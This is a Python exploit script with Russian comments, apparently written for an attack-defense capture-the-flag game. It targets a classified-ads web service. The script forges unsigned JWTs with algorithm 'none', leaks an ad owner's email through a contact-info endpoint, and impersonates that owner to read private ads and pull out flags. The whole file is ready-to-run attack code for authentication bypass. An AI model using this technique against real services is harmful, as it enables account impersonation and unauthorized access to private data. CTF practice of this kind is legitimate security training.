import base64
import json
import re
import sys

import requests


def b64_e(data):
    """Стандартный base64url encode без набивки (padding)."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge_token(email):
    """Генерация JWT с алгоритмом 'none'."""
    # Header: {"alg": "none", "typ": "JWT"}
    header = b64_e(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    # Payload: {"sub": email}
    payload = b64_e(json.dumps({"sub": email}).encode())
    # Токен с alg=none обязан заканчиваться точкой (пустая подпись)
    return f"{header}.{payload}."


def run_exploit(host, port, ad_id):
    url = f"http://{host}:{port}"
    s = requests.Session()

    print(f"[*] Target: {url}, Ad ID: {ad_id}")

    try:
        # 1. Информационная утечка: получаем email владельца через контактную информацию.
        # Код сервиса требует наличие куки "Authorization" для доступа,
        # поэтому сначала даем любой "фейковый" токен.
        dummy_auth = forge_token("guest@guest.com")
        s.cookies.set("Authorization", f"Bearer {dummy_auth}")

        r_info = s.get(f"{url}/ads/{ad_id}/contact_info", timeout=5)
        if r_info.status_code != 200:
            print(
                f"[-] Не удалось получить email владельца. Status: {r_info.status_code}"
            )
            return

        victim_email = r_info.text.strip()
        print(f"[*] Утечка email владельца: {victim_email}")

        # 2. Подделка личности: создаем токен для полученного email.
        malicious_token = forge_token(victim_email)
        # Устанавливаем куку как в коде сервиса (main.py: response.set_cookie)
        s.cookies.set("Authorization", f"Bearer {malicious_token}")

        # 3. Доступ к приватному объявлению.
        # Код в main.py (view_ad) разрешает просмотр приватных объявлений, если user.email == ad.seller
        r_ad = s.get(f"{url}/ads/{ad_id}/", timeout=5)

        if r_ad.status_code == 200:
            # Ищем флаг форматом TEST_FLAG_...=
            # flags = re.findall(r"[A-Za-z0-9_]{5,}={1,2}", r_ad.text)
            # Поиск флага специфичного для хакердома формата
            flags = re.findall(r"[A-Z0-9]{31}=", r_ad.text)
            if flags:
                for f in flags:
                    print(f"[+] НАЙДЕН ФЛАГ: {f}")
            else:
                print(
                    "[-] Страница загружена, но флаг не найден (проверь регулярку или описание объявления)."
                )
                # Для дебага выведем часть страницы
                # print(r_ad.text[:500])
        else:
            print(f"[-] Доступ запрещен или ошибка. Status: {r_ad.status_code}")

    except Exception as e:
        print(f"[-] Ошибка при выполнении эксплойта: {e}")


if __name__ == "__main__":
    # Аргументы: host port ad_id
    h = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    p = sys.argv[2] if len(sys.argv) > 2 else "31337"
    i = sys.argv[3] if len(sys.argv) > 3 else "1"
    run_exploit(h, p, i)
